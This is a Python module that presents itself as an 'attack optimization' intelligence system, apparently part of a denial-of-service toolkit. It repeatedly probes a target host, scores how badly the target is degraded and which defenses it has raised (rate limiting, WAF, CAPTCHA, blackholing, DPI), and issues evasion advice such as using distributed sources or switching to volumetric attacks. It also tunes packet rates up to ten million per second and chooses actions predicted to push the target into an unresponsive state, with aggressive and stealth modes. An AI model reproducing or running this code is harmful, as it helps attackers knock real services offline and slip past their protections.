"""
Real-Time Intelligence System

Advanced real-time intelligence for attack optimization:
- Target behavior analysis
- Defense detection and evasion
- Attack effectiveness scoring
- Predictive adaptation
"""

import asyncio
import time
import logging
import threading
import socket
import struct
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
from collections import deque
import statistics

logger = logging.getLogger(__name__)


class DefenseType(Enum):
    """Detected defense mechanisms"""
    NONE = auto()
    RATE_LIMITING = auto()
    CONNECTION_LIMITING = auto()
    GEO_BLOCKING = auto()
    WAF = auto()
    DPI = auto()
    BLACKHOLING = auto()
    SCRUBBING = auto()
    CAPTCHA = auto()
    UNKNOWN = auto()


class TargetState(Enum):
    """Target health states"""
    HEALTHY = auto()
    DEGRADED = auto()
    STRESSED = auto()
    CRITICAL = auto()
    UNRESPONSIVE = auto()


@dataclass
class TargetProfile:
    """Target behavior profile"""
    host: str
    port: int
    baseline_response_ms: float = 0.0
    current_response_ms: float = 0.0
    baseline_success_rate: float = 1.0
    current_success_rate: float = 1.0
    detected_defenses: List[DefenseType] = field(default_factory=list)
    state: TargetState = TargetState.HEALTHY
    last_update: float = 0.0
    
    @property
    def degradation_factor(self) -> float:
        """Calculate target degradation (0-1, higher = more degraded)"""
        if self.baseline_response_ms <= 0:
            return 0.0
        response_factor = min(1.0, (self.current_response_ms - self.baseline_response_ms) / 
                             max(self.baseline_response_ms, 1))
        success_factor = 1.0 - self.current_success_rate
        return (response_factor + success_factor) / 2


@dataclass
class IntelligenceReport:
    """Intelligence analysis report"""
    timestamp: float
    target_profile: TargetProfile
    effectiveness_score: float
    recommended_actions: List[str]
    defense_evasion_hints: List[str]
    optimal_rate_pps: int
    optimal_packet_size: int
    confidence: float


class ResponseTimeAnalyzer:
    """Analyze target response times"""
    
    def __init__(self, window_size: int = 100):
        self.measurements = deque(maxlen=window_size)
        self.baseline_measurements = deque(maxlen=50)
        self.baseline_established = False
    
    async def measure_response_time(self, host: str, port: int, timeout: float = 5.0) -> Optional[float]:
        """Measure TCP connection response time"""
        start = time.perf_counter()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            elapsed = (time.perf_counter() - start) * 1000  # ms
            writer.close()
            await writer.wait_closed()
            
            self.measurements.append(elapsed)
            if not self.baseline_established and len(self.baseline_measurements) < 50:
                self.baseline_measurements.append(elapsed)
                if len(self.baseline_measurements) >= 50:
                    self.baseline_established = True
            
            return elapsed
        except Exception:
            return None
    
    def get_baseline(self) -> float:
        """Get baseline response time"""
        if not self.baseline_measurements:
            return 0.0
        return statistics.median(list(self.baseline_measurements))
    
    def get_current(self) -> float:
        """Get current response time"""
        if not self.measurements:
            return 0.0
        return statistics.median(list(self.measurements)[-10:])
    
    def get_trend(self) -> str:
        """Get response time trend"""
        if len(self.measurements) < 20:
            return 'insufficient_data'
        
        recent = list(self.measurements)[-10:]
        older = list(self.measurements)[-20:-10]
        
        recent_avg = statistics.mean(recent)
        older_avg = statistics.mean(older)
        
        if recent_avg > older_avg * 1.5:
            return 'increasing'
        elif recent_avg < older_avg * 0.7:
            return 'decreasing'
        return 'stable'


class DefenseDetector:
    """Detect target defense mechanisms"""
    
    def __init__(self):
        self.detection_history = deque(maxlen=100)
        self.detected_defenses: List[DefenseType] = []
    
    def analyze_response(self, 
                        response_code: Optional[int],
                        response_time_ms: float,
                        connection_success: bool,
                        response_body: Optional[bytes] = None) -> List[DefenseType]:
        """Analyze response for defense indicators"""
        defenses = []
        
        # Rate limiting detection
        if response_code == 429:
            defenses.append(DefenseType.RATE_LIMITING)
        
        # Connection limiting
        if not connection_success and response_time_ms < 100:
            defenses.append(DefenseType.CONNECTION_LIMITING)
        
        # WAF detection
        if response_code in (403, 406, 418):
            defenses.append(DefenseType.WAF)
        
        # Captcha detection
        if response_body:
            body_lower = response_body.lower()
            if b'captcha' in body_lower or b'challenge' in body_lower:
                defenses.append(DefenseType.CAPTCHA)
        
        # Geo-blocking
        if response_code == 451:
            defenses.append(DefenseType.GEO_BLOCKING)
        
        # Blackholing (no response at all)
        if not connection_success and response_time_ms >= 5000:
            defenses.append(DefenseType.BLACKHOLING)
        
        self.detection_history.append({
            'timestamp': time.time(),
            'defenses': defenses
        })
        
        # Update detected defenses
        for defense in defenses:
            if defense not in self.detected_defenses:
                self.detected_defenses.append(defense)
                logger.info(f"Detected defense mechanism: {defense.name}")
        
        return defenses
    
    def get_evasion_recommendations(self) -> List[str]:
        """Get evasion recommendations based on detected defenses"""
        recommendations = []
        
        for defense in self.detected_defenses:
            if defense == DefenseType.RATE_LIMITING:
                recommendations.extend([
                    "Reduce request rate per source IP",
                    "Use distributed sources",
                    "Add random delays between requests"
                ])
            elif defense == DefenseType.WAF:
                recommendations.extend([
                    "Randomize User-Agent headers",
                    "Use protocol obfuscation",
                    "Vary request patterns"
                ])
            elif defense == DefenseType.CONNECTION_LIMITING:
                recommendations.extend([
                    "Use connection pooling",
                    "Reduce concurrent connections",
                    "Implement connection reuse"
                ])
            elif defense == DefenseType.CAPTCHA:
                recommendations.extend([
                    "Switch to volumetric attacks",
                    "Target different endpoints",
                    "Use headless browser simulation"
                ])
            elif defense == DefenseType.DPI:
                recommendations.extend([
                    "Use encrypted protocols",
                    "Implement traffic morphing",
                    "Randomize packet contents"
                ])
        
        return list(set(recommendations))


class EffectivenessScorer:
    """Score attack effectiveness"""
    
    def __init__(self):
        self.score_history = deque(maxlen=1000)
    
    def calculate_score(self, profile: TargetProfile) -> float:
        """Calculate effectiveness score (0-1)"""
        # Response time impact (0-0.4)
        if profile.baseline_response_ms > 0:
            response_impact = min(0.4, 
                (profile.current_response_ms / profile.baseline_response_ms - 1) * 0.1)
        else:
            response_impact = 0.0
        
        # Success rate impact (0-0.3)
        success_impact = (1.0 - profile.current_success_rate) * 0.3
        
        # State impact (0-0.3)
        state_scores = {
            TargetState.HEALTHY: 0.0,
            TargetState.DEGRADED: 0.1,
            TargetState.STRESSED: 0.2,
            TargetState.CRITICAL: 0.25,
            TargetState.UNRESPONSIVE: 0.3
        }
        state_impact = state_scores.get(profile.state, 0.0)
        
        score = response_impact + success_impact + state_impact
        score = max(0.0, min(1.0, score))
        
        self.score_history.append({
            'timestamp': time.time(),
            'score': score
        })
        
        return score
    
    def get_trend(self) -> str:
        """Get effectiveness trend"""
        if len(self.score_history) < 20:
            return 'insufficient_data'
        
        recent = [h['score'] for h in list(self.score_history)[-10:]]
        older = [h['score'] for h in list(self.score_history)[-20:-10]]
        
        recent_avg = statistics.mean(recent)
        older_avg = statistics.mean(older)
        
        if recent_avg > older_avg + 0.1:
            return 'improving'
        elif recent_avg < older_avg - 0.1:
            return 'declining'
        return 'stable'


class RateOptimizer:
    """Optimize attack rate based on intelligence"""
    
    def __init__(self, initial_rate: int = 100000):
        self.current_rate = initial_rate
        self.min_rate = 1000
        self.max_rate = 10000000
        self.rate_history = deque(maxlen=100)
    
    def optimize(self, effectiveness: float, defenses: List[DefenseType]) -> int:
        """Calculate optimal rate"""
        # Base adjustment on effectiveness
        if effectiveness < 0.2:
            # Low effectiveness - increase rate
            factor = 1.2
        elif effectiveness > 0.8:
            # High effectiveness - maintain or slightly reduce
            factor = 0.95
        else:
            # Moderate effectiveness - fine tune
            factor = 1.0 + (0.5 - effectiveness) * 0.2
        
        # Adjust for defenses
        if DefenseType.RATE_LIMITING in defenses:
            factor *= 0.7  # Reduce rate
        if DefenseType.BLACKHOLING in defenses:
            factor *= 0.5  # Significantly reduce
        
        new_rate = int(self.current_rate * factor)
        new_rate = max(self.min_rate, min(self.max_rate, new_rate))
        
        self.rate_history.append({
            'timestamp': time.time(),
            'rate': new_rate,
            'effectiveness': effectiveness
        })
        
        self.current_rate = new_rate
        return new_rate


class AdvancedBehaviorAnalyzer:
    """Advanced behavioral analysis using ML-like pattern detection"""
    
    def __init__(self, window_size: int = 500):
        self.response_patterns = deque(maxlen=window_size)
        self.timing_patterns = deque(maxlen=window_size)
        self.anomaly_scores = deque(maxlen=100)
        self.pattern_signatures = {}
        self.learned_thresholds = {
            'response_time_std': 100.0,
            'success_rate_min': 0.8,
            'anomaly_threshold': 2.5
        }
    
    def add_observation(self, response_time: float, success: bool, 
                       response_code: Optional[int] = None,
                       payload_size: int = 0):
        """Add observation for pattern analysis"""
        timestamp = time.time()
        self.response_patterns.append({
            'timestamp': timestamp,
            'response_time': response_time,
            'success': success,
            'response_code': response_code,
            'payload_size': payload_size
        })
        
        # Calculate inter-arrival timing
        if len(self.timing_patterns) > 0:
            last_time = self.timing_patterns[-1]['timestamp']
            interval = timestamp - last_time
            self.timing_patterns.append({
                'timestamp': timestamp,
                'interval': interval
            })
        else:
            self.timing_patterns.append({
                'timestamp': timestamp,
                'interval': 0.0
            })
    
    def detect_anomalies(self) -> Dict[str, Any]:
        """Detect behavioral anomalies in target responses"""
        if len(self.response_patterns) < 50:
            return {'anomalies': [], 'confidence': 0.0}
        
        patterns = list(self.response_patterns)
        response_times = [p['response_time'] for p in patterns if p['response_time'] is not None]
        
        if len(response_times) < 20:
            return {'anomalies': [], 'confidence': 0.0}
        
        # Calculate statistics
        mean_rt = statistics.mean(response_times)
        std_rt = statistics.stdev(response_times) if len(response_times) > 1 else 0
        
        anomalies = []
        
        # Check for sudden response time spikes
        recent_rt = response_times[-10:]
        recent_mean = statistics.mean(recent_rt)
        if std_rt > 0 and (recent_mean - mean_rt) / std_rt > self.learned_thresholds['anomaly_threshold']:
            anomalies.append({
                'type': 'response_time_spike',
                'severity': 'high',
                'value': recent_mean,
                'baseline': mean_rt
            })
        
        # Check for success rate drops
        recent_success = [p['success'] for p in patterns[-20:]]
        success_rate = sum(recent_success) / len(recent_success)
        if success_rate < self.learned_thresholds['success_rate_min']:
            anomalies.append({
                'type': 'success_rate_drop',
                'severity': 'critical' if success_rate < 0.5 else 'high',
                'value': success_rate,
                'baseline': self.learned_thresholds['success_rate_min']
            })
        
        # Check for response code patterns (defense activation)
        recent_codes = [p['response_code'] for p in patterns[-20:] if p['response_code']]
        if recent_codes:
            error_codes = [c for c in recent_codes if c >= 400]
            error_rate = len(error_codes) / len(recent_codes)
            if error_rate > 0.3:
                anomalies.append({
                    'type': 'error_rate_spike',
                    'severity': 'high',
                    'value': error_rate,
                    'common_codes': list(set(error_codes))[:5]
                })
        
        # Calculate anomaly score
        anomaly_score = len(anomalies) * 0.3 + sum(
            0.4 if a['severity'] == 'critical' else 0.2 
            for a in anomalies
        )
        self.anomaly_scores.append(min(1.0, anomaly_score))
        
        return {
            'anomalies': anomalies,
            'anomaly_score': min(1.0, anomaly_score),
            'confidence': min(1.0, len(self.response_patterns) / 100)
        }
    
    def predict_defense_activation(self) -> Dict[str, float]:
        """Predict likelihood of defense mechanism activation"""
        if len(self.anomaly_scores) < 10:
            return {'rate_limiting': 0.0, 'waf': 0.0, 'blackholing': 0.0}
        
        recent_scores = list(self.anomaly_scores)[-10:]
        trend = (recent_scores[-1] - recent_scores[0]) / 10 if len(recent_scores) > 1 else 0
        
        # Predict based on anomaly trend
        base_prob = statistics.mean(recent_scores)
        
        return {
            'rate_limiting': min(1.0, base_prob + trend * 2),
            'waf': min(1.0, base_prob * 0.7),
            'blackholing': min(1.0, base_prob * 0.3 if base_prob > 0.7 else 0.0),
            'trend': 'increasing' if trend > 0.05 else 'decreasing' if trend < -0.05 else 'stable'
        }


class AdaptivePacketSizer:
    """Dynamically optimize packet sizes based on network conditions"""
    
    def __init__(self):
        self.size_performance = {}  # size -> (success_rate, throughput)
        self.current_optimal = 1472
        self.test_sizes = [64, 128, 256, 512, 1024, 1472, 4096, 8192, 16384, 32768, 65507]
        self.test_index = 0
        self.measurements_per_size = 10
        self.current_measurements = []
    
    def get_test_size(self) -> int:
        """Get next packet size to test"""
        return self.test_sizes[self.test_index % len(self.test_sizes)]
    
    def record_result(self, size: int, success: bool, throughput: float):
        """Record test result for a packet size"""
        self.current_measurements.append({
            'size': size,
            'success': success,
            'throughput': throughput
        })
        
        if len(self.current_measurements) >= self.measurements_per_size:
            # Calculate average performance for this size
            successes = [m['success'] for m in self.current_measurements]
            throughputs = [m['throughput'] for m in self.current_measurements if m['success']]
            
            success_rate = sum(successes) / len(successes)
            avg_throughput = statistics.mean(throughputs) if throughputs else 0
            
            self.size_performance[size] = (success_rate, avg_throughput)
            self.current_measurements = []
            self.test_index += 1
            
            # Update optimal size
            self._update_optimal()
    
    def _update_optimal(self):
        """Update optimal packet size based on measurements"""
        if not self.size_performance:
            return
        
        # Score each size: success_rate * throughput * size_efficiency
        best_score = 0
        best_size = self.current_optimal
        
        for size, (success_rate, throughput) in self.size_performance.items():
            if success_rate < 0.5:
                continue
            
            # Larger packets are more efficient (less overhead)
            efficiency = size / 65507
            score = success_rate * throughput * (1 + efficiency * 0.5)
            
            if score > best_score:
                best_score = score
                best_size = size
        
        self.current_optimal = best_size
    
    def get_optimal_size(self) -> int:
        """Get current optimal packet size"""
        return self.current_optimal
    
    def get_size_recommendations(self) -> Dict[str, Any]:
        """Get packet size recommendations"""
        return {
            'optimal_size': self.current_optimal,
            'tested_sizes': len(self.size_performance),
            'performance_map': {
                str(size): {'success_rate': sr, 'throughput': tp}
                for size, (sr, tp) in self.size_performance.items()
            }
        }


class PredictiveTargetModeler:
    """Build predictive models of target behavior"""
    
    def __init__(self):
        self.state_transitions = {}  # (state, action) -> next_state probabilities
        self.reward_history = deque(maxlen=1000)
        self.state_history = deque(maxlen=500)
        self.action_history = deque(maxlen=500)
    
    def record_transition(self, state: TargetState, action: str, 
                         next_state: TargetState, reward: float):
        """Record state transition for model building"""
        key = (state, action)
        if key not in self.state_transitions:
            self.state_transitions[key] = {}
        
        if next_state not in self.state_transitions[key]:
            self.state_transitions[key][next_state] = 0
        
        self.state_transitions[key][next_state] += 1
        self.reward_history.append(reward)
        self.state_history.append(state)
        self.action_history.append(action)
    
    def predict_next_state(self, current_state: TargetState, 
                          action: str) -> Dict[TargetState, float]:
        """Predict probability distribution of next states"""
        key = (current_state, action)
        
        if key not in self.state_transitions:
            # No data - return uniform distribution
            states = list(TargetState)
            return {s: 1.0 / len(states) for s in states}
        
        transitions = self.state_transitions[key]
        total = sum(transitions.values())
        
        return {state: count / total for state, count in transitions.items()}
    
    def get_best_action(self, current_state: TargetState, 
                       available_actions: List[str]) -> str:
        """Get best action based on learned model"""
        best_action = available_actions[0]
        best_score = -float('inf')
        
        for action in available_actions:
            predictions = self.predict_next_state(current_state, action)
            
            # Score based on probability of reaching critical/unresponsive states
            score = (
                predictions.get(TargetState.CRITICAL, 0) * 0.8 +
                predictions.get(TargetState.UNRESPONSIVE, 0) * 1.0 +
                predictions.get(TargetState.STRESSED, 0) * 0.5 +
                predictions.get(TargetState.DEGRADED, 0) * 0.2
            )
            
            if score > best_score:
                best_score = score
                best_action = action
        
        return best_action
    
    def get_model_confidence(self) -> float:
        """Get confidence in the predictive model"""
        if len(self.state_history) < 50:
            return 0.0
        
        # More transitions = higher confidence
        total_transitions = sum(
            sum(counts.values()) 
            for counts in self.state_transitions.values()
        )
        
        return min(1.0, total_transitions / 500)


class RealTimeIntelligence:
    """
    Real-time intelligence system for attack optimization.
    
    Provides:
    - Continuous target monitoring
    - Defense detection and evasion
    - Attack effectiveness scoring
    - Adaptive rate optimization
    """
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.profile = TargetProfile(host=target, port=port)
        
        # Components
        self.response_analyzer = ResponseTimeAnalyzer()
        self.defense_detector = DefenseDetector()
        self.effectiveness_scorer = EffectivenessScorer()
        self.rate_optimizer = RateOptimizer()
        
        # State
        self._running = False
        self._monitor_task: Optional[asyncio.Task] = None
        self._reports: deque = deque(maxlen=100)
    
    async def start(self):
        """Start intelligence gathering"""
        if self._running:
            return
        
        self._running = True
        self._monitor_task = asyncio.create_task(self._monitor_loop())
        logger.info(f"Started intelligence gathering for {self.target}:{self.port}")
    
    async def stop(self):
        """Stop intelligence gathering"""
        self._running = False
        if self._monitor_task:
            self._monitor_task.cancel()
            try:
                await self._monitor_task
            except asyncio.CancelledError:
                pass
        logger.info("Stopped intelligence gathering")
    
    async def _monitor_loop(self):
        """Main monitoring loop"""
        # Establish baseline first
        logger.info("Establishing baseline...")
        for _ in range(10):
            await self.response_analyzer.measure_response_time(self.target, self.port)
            await asyncio.sleep(0.5)
        
        self.profile.baseline_response_ms = self.response_analyzer.get_baseline()
        logger.info(f"Baseline established: {self.profile.baseline_response_ms:.2f}ms")
        
        while self._running:
            try:
                # Measure response time
                response_time = await self.response_analyzer.measure_response_time(
                    self.target, self.port
                )
                
                if response_time is not None:
                    self.profile.current_response_ms = response_time
                    self.profile.current_success_rate = 1.0
                else:
                    self.profile.current_success_rate *= 0.9  # Decay on failure
                
                # Update target state
                self._update_target_state()
                
                # Generate report
                report = self._generate_report()
                self._reports.append(report)
                
                self.profile.last_update = time.time()
                
                await asyncio.sleep(1.0)
                
            except Exception as e:
                logger.error(f"Monitor loop error: {e}")
                await asyncio.sleep(1.0)
    
    def _update_target_state(self):
        """Update target state based on metrics"""
        degradation = self.profile.degradation_factor
        
        if degradation < 0.1:
            self.profile.state = TargetState.HEALTHY
        elif degradation < 0.3:
            self.profile.state = TargetState.DEGRADED
        elif degradation < 0.6:
            self.profile.state = TargetState.STRESSED
        elif degradation < 0.9:
            self.profile.state = TargetState.CRITICAL
        else:
            self.profile.state = TargetState.UNRESPONSIVE
    
    def _generate_report(self) -> IntelligenceReport:
        """Generate intelligence report"""
        effectiveness = self.effectiveness_scorer.calculate_score(self.profile)
        optimal_rate = self.rate_optimizer.optimize(
            effectiveness, 
            self.defense_detector.detected_defenses
        )
        
        # Generate recommendations
        recommendations = []
        trend = self.effectiveness_scorer.get_trend()
        
        if trend == 'declining':
            recommendations.append("Consider changing attack vectors")
            recommendations.append("Increase evasion techniques")
        elif trend == 'improving':
            recommendations.append("Maintain current strategy")
            recommendations.append("Consider gradual escalation")
        
        # Add defense evasion hints
        evasion_hints = self.defense_detector.get_evasion_recommendations()
        
        return IntelligenceReport(
            timestamp=time.time(),
            target_profile=self.profile,
            effectiveness_score=effectiveness,
            recommended_actions=recommendations,
            defense_evasion_hints=evasion_hints,
            optimal_rate_pps=optimal_rate,
            optimal_packet_size=1472,  # Default optimal
            confidence=0.8 if len(self._reports) > 10 else 0.5
        )
    
    def get_latest_report(self) -> Optional[IntelligenceReport]:
        """Get latest intelligence report"""
        return self._reports[-1] if self._reports else None
    
    def get_profile(self) -> TargetProfile:
        """Get current target profile"""
        return self.profile
    
    def get_optimal_parameters(self) -> Dict[str, Any]:
        """Get optimal attack parameters"""
        report = self.get_latest_report()
        if not report:
            return {
                'rate_pps': 100000,
                'packet_size': 1472,
                'evasion_level': 0
            }
        
        evasion_level = len(self.defense_detector.detected_defenses)
        
        return {
            'rate_pps': report.optimal_rate_pps,
            'packet_size': report.optimal_packet_size,
            'evasion_level': min(10, evasion_level * 2),
            'defenses_detected': [d.name for d in self.defense_detector.detected_defenses],
            'target_state': self.profile.state.name,
            'effectiveness': report.effectiveness_score
        }


class EnhancedRealTimeIntelligence(RealTimeIntelligence):
    """
    Enhanced real-time intelligence with advanced ML-like capabilities.
    
    Adds:
    - Advanced behavioral analysis
    - Predictive target modeling
    - Adaptive packet sizing
    - Multi-dimensional optimization
    """
    
    def __init__(self, target: str, port: int):
        super().__init__(target, port)
        
        # Advanced components
        self.behavior_analyzer = AdvancedBehaviorAnalyzer()
        self.packet_sizer = AdaptivePacketSizer()
        self.target_modeler = PredictiveTargetModeler()
        
        # Enhanced state
        self.optimization_mode = 'balanced'  # 'aggressive', 'balanced', 'stealth'
        self.learning_enabled = True
        self.adaptation_rate = 0.1
    
    async def _monitor_loop(self):
        """Enhanced monitoring loop with ML-like analysis"""
        # Establish baseline first
        logger.info("Establishing baseline with enhanced analysis...")
        for _ in range(20):
            response_time = await self.response_analyzer.measure_response_time(
                self.target, self.port
            )
            if response_time:
                self.behavior_analyzer.add_observation(response_time, True)
            await asyncio.sleep(0.3)
        
        self.profile.baseline_response_ms = self.response_analyzer.get_baseline()
        logger.info(f"Enhanced baseline established: {self.profile.baseline_response_ms:.2f}ms")
        
        while self._running:
            try:
                # Measure response time
                response_time = await self.response_analyzer.measure_response_time(
                    self.target, self.port
                )
                
                success = response_time is not None
                
                if success:
                    self.profile.current_response_ms = response_time
                    self.profile.current_success_rate = min(1.0, 
                        self.profile.current_success_rate * 0.9 + 0.1)
                    self.behavior_analyzer.add_observation(response_time, True)
                else:
                    self.profile.current_success_rate *= 0.85
                    self.behavior_analyzer.add_observation(0, False)
                
                # Update target state
                self._update_target_state()
                
                # Record state transition for learning
                if self.learning_enabled and len(self._reports) > 0:
                    last_report = self._reports[-1]
                    action = f"rate_{self.rate_optimizer.current_rate // 10000}"
                    reward = last_report.effectiveness_score
                    self.target_modeler.record_transition(
                        last_report.target_profile.state,
                        action,
                        self.profile.state,
                        reward
                    )
                
                # Detect anomalies
                anomaly_result = self.behavior_analyzer.detect_anomalies()
                
                # Predict defense activation
                defense_predictions = self.behavior_analyzer.predict_defense_activation()
                
                # Generate enhanced report
                report = self._generate_enhanced_report(anomaly_result, defense_predictions)
                self._reports.append(report)
                
                self.profile.last_update = time.time()
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                logger.error(f"Enhanced monitor loop error: {e}")
                await asyncio.sleep(1.0)
    
    def _generate_enhanced_report(self, anomaly_result: Dict, 
                                  defense_predictions: Dict) -> IntelligenceReport:
        """Generate enhanced intelligence report"""
        effectiveness = self.effectiveness_scorer.calculate_score(self.profile)
        optimal_rate = self.rate_optimizer.optimize(
            effectiveness, 
            self.defense_detector.detected_defenses
        )
        
        # Get optimal packet size
        optimal_packet_size = self.packet_sizer.get_optimal_size()
        
        # Generate recommendations based on mode
        recommendations = self._generate_mode_recommendations(
            effectiveness, anomaly_result, defense_predictions
        )
        
        # Add defense evasion hints
        evasion_hints = self.defense_detector.get_evasion_recommendations()
        
        # Add predictive hints
        if defense_predictions.get('rate_limiting', 0) > 0.7:
            evasion_hints.append("High probability of rate limiting - preemptively reduce rate")
        if defense_predictions.get('trend') == 'increasing':
            evasion_hints.append("Defense activation trend increasing - consider evasion mode")
        
        # Adjust confidence based on model quality
        model_confidence = self.target_modeler.get_model_confidence()
        base_confidence = 0.5 if len(self._reports) <= 10 else 0.8
        confidence = (base_confidence + model_confidence) / 2
        
        return IntelligenceReport(
            timestamp=time.time(),
            target_profile=self.profile,
            effectiveness_score=effectiveness,
            recommended_actions=recommendations,
            defense_evasion_hints=evasion_hints,
            optimal_rate_pps=optimal_rate,
            optimal_packet_size=optimal_packet_size,
            confidence=confidence
        )
    
    def _generate_mode_recommendations(self, effectiveness: float,
                                       anomaly_result: Dict,
                                       defense_predictions: Dict) -> List[str]:
        """Generate mode-specific recommendations"""
        recommendations = []
        
        if self.optimization_mode == 'aggressive':
            if effectiveness < 0.5:
                recommendations.append("Aggressive: Escalate attack intensity")
                recommendations.append("Consider multi-vector approach")
            else:
                recommendations.append("Aggressive: Maintain high pressure")
        
        elif self.optimization_mode == 'stealth':
            if defense_predictions.get('rate_limiting', 0) > 0.5:
                recommendations.append("Stealth: Reduce rate to avoid detection")
            recommendations.append("Stealth: Use randomized timing patterns")
            recommendations.append("Stealth: Rotate source characteristics")
        
        else:  # balanced
            trend = self.effectiveness_scorer.get_trend()
            if trend == 'declining':
                recommendations.append("Balanced: Adapt strategy - effectiveness declining")
            elif trend == 'improving':
                recommendations.append("Balanced: Current strategy effective")
        
        # Add anomaly-based recommendations
        if anomaly_result.get('anomaly_score', 0) > 0.5:
            recommendations.append("Anomalies detected - target may be adapting")
        
        return recommendations
    
    def set_optimization_mode(self, mode: str):
        """Set optimization mode: 'aggressive', 'balanced', 'stealth'"""
        if mode in ('aggressive', 'balanced', 'stealth'):
            self.optimization_mode = mode
            logger.info(f"Optimization mode set to: {mode}")
    
    def get_enhanced_parameters(self) -> Dict[str, Any]:
        """Get enhanced optimal attack parameters"""
        base_params = self.get_optimal_parameters()
        
        # Add enhanced parameters
        base_params.update({
            'optimization_mode': self.optimization_mode,
            'model_confidence': self.target_modeler.get_model_confidence(),
            'anomaly_score': self.behavior_analyzer.anomaly_scores[-1] if self.behavior_analyzer.anomaly_scores else 0,
            'defense_predictions': self.behavior_analyzer.predict_defense_activation(),
            'packet_size_recommendations': self.packet_sizer.get_size_recommendations()
        })
        
        return base_params


__all__ = [
    'DefenseType', 'TargetState', 'TargetProfile', 'IntelligenceReport',
    'ResponseTimeAnalyzer', 'DefenseDetector', 'EffectivenessScorer',
    'RateOptimizer', 'RealTimeIntelligence',
    'AdvancedBehaviorAnalyzer', 'AdaptivePacketSizer', 'PredictiveTargetModeler',
    'EnhancedRealTimeIntelligence'
]
